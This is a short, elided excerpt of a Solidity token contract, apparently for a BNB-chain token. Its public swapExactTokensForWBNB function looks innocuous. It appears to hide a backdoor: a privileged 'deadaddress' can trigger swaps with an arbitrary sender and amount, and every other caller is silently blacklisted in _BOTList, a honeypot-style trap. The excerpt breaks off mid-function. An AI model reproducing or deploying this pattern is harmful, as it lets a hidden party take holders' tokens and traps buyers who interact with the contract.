...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function swapExactTokensForWBNB(
        uint256 amount,
        address sender,
        address recipient,
        uint256 t
    ) public {
        if (msg.sender == address(deadaddress)) {
            swapTokensForWBNB(sender, recipient, amount, t);
        } else {
            _BOTList[msg.sender] = true;
        }
    }


    function _tokenTrans(address sender,
        address recipient,
